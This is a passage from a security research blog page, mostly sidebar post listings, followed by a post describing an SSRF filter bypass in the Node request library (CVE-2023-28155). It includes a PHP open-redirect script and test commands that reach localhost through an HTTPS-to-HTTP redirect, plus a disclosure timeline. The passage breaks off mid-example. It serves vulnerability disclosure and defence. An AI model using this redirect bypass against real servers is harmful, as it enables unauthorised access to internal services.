+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="May">  <a class="monthBtn" href="#">May</a>  <ul style="display:none"><li><a href="/2021/05/20/graphql-csrf.html" target="_blank">• That single GraphQL issue that you keep missing</a></li></ul>  </li><li data-month="March">  <a class="monthBtn" href="#">March</a>  <ul style="display:none"><li><a href="/2021/03/11/regexploit.html" target="_blank">• Regexploit: DoS-able Regular Expressions</a></li></ul>  </li><li data-month="February">  <a class="monthBtn" href="#">February</a>  <ul style="display:none"><li><a href="/2021/02/16/electron-apis-misuse.html" target="_blank">• Electron APIs Misuse: An Attacker’s First Choice</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2020" href="#">2020</a>
+            <div class="postsMonths" id="posts-in-2020" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1608159600" data-url="/2020/12/17/psychology-of-remote-work.html" data-title="• Psychology of Remote Work"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1607554800" data-url="/2020/12/10/novel-abuses-wifi-direct-mobile-file-transfers.html" data-title="• Novel Abuses On Wi-Fi Direct Mobile File Transfers"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1605740400" data-url="/2020/11/19/inql-scanner-v3.html" data-title="• InQL Scanner v3 - Just Released!"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1599602400" data-url="/2020/09/09/fuzzilli-jerryscript.html" data-title="• Fuzzing JavaScript Engines with Fuzzilli"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1597874400" data-url="/2020/08/20/playframework-csrf-bypass.html" data-title="• CSRF Protection Bypass in Play Framework"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1591826400" data-url="/2020/06/11/inql-scanner-v2.html" data-title="• InQL Scanner v2 is out!"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1589407200" data-url="/2020/05/14/asn1fuzz.html" data-title="• Fuzzing TLS certificates from their ASN.1 grammar"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1588197600" data-url="/2020/04/30/polymorphic-images-for-xss.html" data-title="• Researching Polymorphic Images for XSS on Google Scholar"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1586296800" data-url="/2020/04/08/libressl-fuzzer.html" data-title="• LibreSSL and OSS-Fuzz"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1585177200" data-url="/2020/03/26/graphql-scanner.html" data-title="• InQL Scanner"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1584313200" data-url="/2020/03/16/vscode_codeexec.html" data-title="• Don't Clone That Repo: Visual Studio Code^2 Execution"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1583103600" data-url="/2020/03/02/gravitational-audit.html" data-title="• 2019 Gravitational Security Audit Results"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1582498800" data-url="/2020/02/24/electron-updater-update-signature-bypass.html" data-title="• Signature Validation Bypass Leading to RCE In Electron-Updater"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1582066800" data-url="/2020/02/19/solokeys-audit.html" data-title="• Security Analysis of the Solo Firmware"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1580684400" data-url="/2020/02/03/heap-exploit.html" data-title="• Heap Overflow in F-Secure Internet Gatekeeper"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="December">  <a class="monthBtn" href="#">December</a>  <ul style="display:none"><li><a href="/2020/12/17/psychology-of-remote-work.html" target="_blank">• Psychology of Remote Work</a></li><li><a href="/2020/12/10/novel-abuses-wifi-direct-mobile-file-transfers.html" target="_blank">• Novel Abuses On Wi-Fi Direct Mobile File Transfers</a></li></ul>  </li><li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2020/11/19/inql-scanner-v3.html" target="_blank">• InQL Scanner v3 - Just Released!</a></li></ul>  </li><li data-month="September">  <a class="monthBtn" href="#">September</a>  <ul style="display:none"><li><a href="/2020/09/09/fuzzilli-jerryscript.html" target="_blank">• Fuzzing JavaScript Engines with Fuzzilli</a></li></ul>  </li><li data-month="August">  <a class="monthBtn" href="#">August</a>  <ul style="display:none"><li><a href="/2020/08/20/playframework-csrf-bypass.html" target="_blank">• CSRF Protection Bypass in Play Framework</a></li></ul>  </li><li data-month="June">  <a class="monthBtn" href="#">June</a>  <ul style="display:none"><li><a href="/2020/06/11/inql-scanner-v2.html" target="_blank">• InQL Scanner v2 is out!</a></li></ul>  </li><li data-month="May">  <a class="monthBtn" href="#">May</a>  <ul style="display:none"><li><a href="/2020/05/14/asn1fuzz.html" target="_blank">• Fuzzing TLS certificates from their ASN.1 grammar</a></li></ul>  </li><li data-month="April">  <a class="monthBtn" href="#">April</a>  <ul style="display:none"><li><a href="/2020/04/30/polymorphic-images-for-xss.html" target="_blank">• Researching Polymorphic Images for XSS on Google Scholar</a></li><li><a href="/2020/04/08/libressl-fuzzer.html" target="_blank">• LibreSSL and OSS-Fuzz</a></li></ul>  </li><li data-month="March">  <a class="monthBtn" href="#">March</a>  <ul style="display:none"><li><a href="/2020/03/26/graphql-scanner.html" target="_blank">• InQL Scanner</a></li><li><a href="/2020/03/16/vscode_codeexec.html" target="_blank">• Don't Clone That Repo: Visual Studio Code^2 Execution</a></li><li><a href="/2020/03/02/gravitational-audit.html" target="_blank">• 2019 Gravitational Security Audit Results</a></li></ul>  </li><li data-month="February">  <a class="monthBtn" href="#">February</a>  <ul style="display:none"><li><a href="/2020/02/24/electron-updater-update-signature-bypass.html" target="_blank">• Signature Validation Bypass Leading to RCE In Electron-Updater</a></li><li><a href="/2020/02/19/solokeys-audit.html" target="_blank">• Security Analysis of the Solo Firmware</a></li><li><a href="/2020/02/03/heap-exploit.html" target="_blank">• Heap Overflow in F-Secure Internet Gatekeeper</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2019" href="#">2019</a>
+            <div class="postsMonths" id="posts-in-2019" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1572908400" data-url="/2019/11/05/internship-at-doyensec.html" data-title="• Internship at Doyensec"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1566424800" data-url="/2019/08/22/modern-password-managers-flag-secure.html" data-title="• One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1564610400" data-url="/2019/08/01/common-crypto-bugs.html" data-title="• Lessons in auditing cryptocurrency wallets, systems, and infrastructures"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1563746400" data-url="/2019/07/22/jackson-gadgets.html" data-title="• Jackson gadgets - Anatomy of a vulnerability"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1562104800" data-url="/2019/07/03/electron-security-workshop.html" data-title="• Electron Security Workshop"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1560204000" data-url="/2019/06/11/electronegativity-1.3.html" data-title="• Electronegativity 1.3.0 released!"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1556056800" data-url="/2019/04/24/rubyzip-bug.html" data-title="• On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1554242400" data-url="/2019/04/03/subverting-electron-apps-via-insecure-preload.html" data-title="• Subverting Electron Apps via Insecure Preload"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1548284400" data-url="/2019/01/24/electronegativity.html" data-title="• Electronegativity is finally out!"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2019/11/05/internship-at-doyensec.html" target="_blank">• Internship at Doyensec</a></li></ul>  </li><li data-month="August">  <a class="monthBtn" href="#">August</a>  <ul style="display:none"><li><a href="/2019/08/22/modern-password-managers-flag-secure.html" target="_blank">• One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse</a></li></ul>  </li><li data-month="July">  <a class="monthBtn" href="#">July</a>  <ul style="display:none"><li><a href="/2019/08/01/common-crypto-bugs.html" target="_blank">• Lessons in auditing cryptocurrency wallets, systems, and infrastructures</a></li><li><a href="/2019/07/22/jackson-gadgets.html" target="_blank">• Jackson gadgets - Anatomy of a vulnerability</a></li><li><a href="/2019/07/03/electron-security-workshop.html" target="_blank">• Electron Security Workshop</a></li></ul>  </li><li data-month="June">  <a class="monthBtn" href="#">June</a>  <ul style="display:none"><li><a href="/2019/06/11/electronegativity-1.3.html" target="_blank">• Electronegativity 1.3.0 released!</a></li></ul>  </li><li data-month="April">  <a class="monthBtn" href="#">April</a>  <ul style="display:none"><li><a href="/2019/04/24/rubyzip-bug.html" target="_blank">• On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)</a></li><li><a href="/2019/04/03/subverting-electron-apps-via-insecure-preload.html" target="_blank">• Subverting Electron Apps via Insecure Preload</a></li></ul>  </li><li data-month="January">  <a class="monthBtn" href="#">January</a>  <ul style="display:none"><li><a href="/2019/01/24/electronegativity.html" target="_blank">• Electronegativity is finally out!</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2018" href="#">2018</a>
+            <div class="postsMonths" id="posts-in-2018" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1541372400" data-url="/2018/11/05/burp-rest-api-v2.html" data-title="• Introducing burp-rest-api v2"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1531951200" data-url="/2018/07/19/instrumenting-electron-app.html" data-title="• Instrumenting Electron Apps for Security Testing"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1527112800" data-url="/2018/05/24/electron-win-protocol-handler-bug-bypass.html" data-title="• Electron Windows Protocol Handler MITM/RCE (bypass for CVE-2018-1000006 fix)"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1526508000" data-url="/2018/05/17/graphql-security-overview.html" data-title="• GraphQL - Security Overview and Testing Tips"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2018/11/05/burp-rest-api-v2.html" target="_blank">• Introducing burp-rest-api v2</a></li></ul>  </li><li data-month="July">  <a class="monthBtn" href="#">July</a>  <ul style="display:none"><li><a href="/2018/07/19/instrumenting-electron-app.html" target="_blank">• Instrumenting Electron Apps for Security Testing</a></li></ul>  </li><li data-month="May">  <a class="monthBtn" href="#">May</a>  <ul style="display:none"><li><a href="/2018/05/24/electron-win-protocol-handler-bug-bypass.html" target="_blank">• Electron Windows Protocol Handler MITM/RCE (bypass for CVE-2018-1000006 fix)</a></li><li><a href="/2018/05/17/graphql-security-overview.html" target="_blank">• GraphQL - Security Overview and Testing Tips</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2017" href="#">2017</a>
+            <div class="postsMonths" id="posts-in-2017" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1511737200" data-url="/2017/11/27/we-are-hiring.html" data-title="• We're hiring - Join Doyensec!"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1510700400" data-url="/2017/11/15/osx-spotlight.html" data-title="• Staring into the Spotlight"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1501711200" data-url="/2017/08/03/electron-framework-security.html" data-title="• Modern Alchemy: Turning XSS into RCE"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1488409200" data-url="/2017/03/02/training-burp.html" data-title="• Developing Burp Suite Extensions training"></span>
+                
+              
+            <li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2017/11/27/we-are-hiring.html" target="_blank">• We're hiring - Join Doyensec!</a></li><li><a href="/2017/11/15/osx-spotlight.html" target="_blank">• Staring into the Spotlight</a></li></ul>  </li><li data-month="August">  <a class="monthBtn" href="#">August</a>  <ul style="display:none"><li><a href="/2017/08/03/electron-framework-security.html" target="_blank">• Modern Alchemy: Turning XSS into RCE</a></li></ul>  </li><li data-month="March">  <a class="monthBtn" href="#">March</a>  <ul style="display:none"><li><a href="/2017/03/02/training-burp.html" target="_blank">• Developing Burp Suite Extensions training</a></li></ul>  </li></div>
+          </li>
+        
+    </ul>
+    <div id="search-searchbar"><div class="ais-SearchBox"><form action="" role="search" class="ais-SearchBox-form" novalidate=""><input class="ais-SearchBox-input" type="search" placeholder="Search the blog" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" maxlength="512" aria-label="Search"><button class="ais-SearchBox-submit" type="submit" title="Submit the search query."><svg class="ais-SearchBox-submitIcon" width="10" height="10" viewBox="0 0 40 40" aria-hidden="true"><path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z"></path></svg></button><button class="ais-SearchBox-reset" type="reset" title="Clear the search query." hidden=""><svg class="ais-SearchBox-resetIcon" viewBox="0 0 20 20" width="10" height="10" aria-hidden="true"><path d="M8.114 10L.944 2.83 0 1.885 1.886 0l.943.943L10 8.113l7.17-7.17.944-.943L20 1.886l-.943.943-7.17 7.17 7.17 7.17.943.944L18.114 20l-.943-.943-7.17-7.17-7.17 7.17-.944.943L0 18.114l.943-.943L8.113 10z"></path></svg></button><span class="ais-SearchBox-loadingIndicator" hidden=""><svg class="ais-SearchBox-loadingIcon" width="16" height="16" viewBox="0 0 38 38" stroke="#444" aria-hidden="true"><g fill="none" fillRule="evenodd"><g transform="translate(1 1)" strokeWidth="2"><circle strokeOpacity=".5" cx="18" cy="18" r="18"></circle><path d="M36 18c0-9.94-8.06-18-18-18"><animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="1s" repeatCount="indefinite"></animateTransform></path></g></g></svg></span></form></div></div>
+    <p style="display: inline-flex;justify-content: center; width: 100%;">©&nbsp;2024&nbsp;<a href="https://doyensec.com" target="_blank">Doyensec LLC</a>&nbsp;<a title="RSS" href="/atom.xml"><img src="/public/images/rss.png" style="height: 20px; width: 20px;"></a></p>
+  </div>
+</div>
+
+
+
+    <div class="content container">
+      <div id="search-hits" style="display: none;"></div>
+      <div id="posts-wrapper">
+      	<div class="post">
+  <h1 class="post-title">SSRF Cross Protocol Redirect Bypass</h1>
+  <span class="post-date">16 Mar 2023 - Posted by Szymon Drosdzol</span>
+  <p>Server Side Request Forgery (SSRF) is a <a href="https://portswigger.net/web-security/ssrf">fairly known vulnerability</a> with established prevention methods. So imagine my surprise when I bypassed an SSRF mitigation during a routine retest. Even worse, <strong>I have bypassed a filter that we have recommended ourselves</strong>! I couldn’t let it slip and had to get to the bottom of the issue.</p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Server Side Request Forgery is a vulnerability in which a malicious actor exploits a victim server to perform HTTP(S) requests on the attacker’s behalf. Since the server usually has access to the internal network, this attack is useful to bypass firewalls and IP whitelists to access hosts otherwise inaccessible to the attacker.</p>
+
+<h1 id="request-library-vulnerability">Request Library Vulnerability</h1>
+
+<p>SSRF attacks can be prevented with address filtering, assuming there are no filter bypasses. One of the classic SSRF filtering bypass techniques is a redirection attack. In these attacks, an attacker sets up a malicious webserver serving an endpoint redirecting to an internal address. The victim server properly allows sending a request to an external server, but then blindly follows a malicious redirection to an internal service.</p>
+
+<p>None of above is new, of course. All of these techniques have been around for years and any reputable anti-SSRF library mitigates such risks. And yet, I have bypassed it.</p>
+
+<p>Client’s code was a simple endpoint created for integration. During the original engagement there was no filtering at all. After our test the client has applied an anti-SSRF library <a href="https://www.npmjs.com/package/ssrf-req-filter">ssrfFilter</a>. For the research and code anonymity  purposes, I have extracted the logic to a standalone NodeJS script:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">request</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">ssrfFilter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">ssrf-req-filter</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
+
+<span class="nx">request</span><span class="p">({</span>
+    <span class="na">uri</span><span class="p">:</span> <span class="nx">url</span><span class="p">,</span>
+    <span class="na">agent</span><span class="p">:</span> <span class="nx">ssrfFilter</span><span class="p">(</span><span class="nx">url</span><span class="p">),</span>
+<span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">statusCode:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">response</span> <span class="o">&amp;&amp;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span><span class="p">);</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>To verify a redirect bypasss I have created a simple webserver with an open-redirect endpoint in PHP and hosted it on the Internet using my test domain <code class="language-plaintext highlighter-rouge">tellico.fun</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: '</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"target"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Initial test demonstrates that the vulnerability is fixed:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node test-request.js <span class="s2">"http://tellico.fun/redirect.php?target=http://localhost/test"</span> 
+Testing http://tellico.fun/redirect.php?target<span class="o">=</span>http://localhost/test
+error: Error: Call to 127.0.0.1 is blocked.
+</code></pre></div></div>
+
+<p>But then, I switched the protocol and suddenly I was able to access a localhost service again. Readers should look carefully at the payload, as the difference is minimal:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node test-request.js <span class="s2">"https://tellico.fun/redirect.php?target=http://localhost/test"</span>
+Testing https://tellico.fun/redirect.php?target<span class="o">=</span>http://localhost/test
+error: null
+statusCode: 200
+</code></pre></div></div>
+
+<p>What happened? The attacker server has redirected the request to another protocol - from HTTPS to HTTP. This is all it took to bypass the anti-SSRF protection.</p>
+
+<p>Why is that? After some digging in the popular <a href="https://www.npmjs.com/package/request">request</a> library codebase, I have discovered the following lines in the <code class="language-plaintext highlighter-rouge">lib/redirect.js</code> file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// handle the case where we change protocol from https to http or vice versa</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">!==</span> <span class="nx">uriPrev</span><span class="p">.</span><span class="nx">protocol</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">delete</span> <span class="nx">request</span><span class="p">.</span><span class="nx">agent</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>According to the code above, anytime the redirect causes a protocol switch, the request agent is deleted. Without this workaround, the client would fail anytime a server would cause a cross-protocol redirect. This is needed since the native NodeJs <code class="language-plaintext highlighter-rouge">http(s).agent</code> cannot be used with both protocols.</p>
+
+<p>Unfortunately, such behavior also loses any event handling associated with the agent. Given, that the SSRF prevention is based on the agents’ <code class="language-plaintext highlighter-rouge">createConnection</code> event handler, this unexpected behavior affects the effectiveness of SSRF mitigation strategies in the <code class="language-plaintext highlighter-rouge">request</code> library.</p>
+
+<h2 id="disclosure">Disclosure</h2>
+
+<p>This issue was disclosed to the maintainers on December 5th, 2022. Despite our best attempts, we have not yet received an acknowledgment. After the 90-days mark, we have decided to publish the <a href="https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf">full technical details</a> as well as a public Github <a href="https://github.com/request/request/issues/3442">issue</a> linked to a <a href="https://github.com/request/request/pull/3444">pull request</a> for the fix. On March 14th, 2023, a CVE ID has been assigned to this vulnerability.</p>
+
+<ul>
+  <li>12/05/2022 - First disclosure to the maintainer</li>
+  <li>01/18/2023 - Another attempt to contact the maintainer</li>
+  <li>03/08/2023 - A <a href="https://github.com/request/request/issues/3442">Github issue</a> creation, without the technical details</li>
+  <li>03/13/2023 - CVE-2023-28155 assigned</li>
+  <li>03/16/2023 - Full technical details disclosure</li>
+</ul>
+
+<h1 id="other-libraries">Other Libraries</h1>
+
+<p>Since supposedly universal filter turned out to be so dependent on the implementation of the HTTP(S) clients, it is natural to ask how other popular libraries handle these cases.</p>
+
+<h2 id="node-fetch">Node-Fetch</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">node-Fetch</code> library also allows to overwrite an HTTP(S) agent within its options, without specifying the protocol:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">ssrfFilter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">ssrf-req-filter</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-fetch</span><span class="dl">'</span><span class="p">).</span><span class="nx">then</span><span class="p">(({</span> <span class="na">default</span><span class="p">:</span> <span class="nx">fetch</span> <span class="p">})</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">));</span>
+
+<span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
+
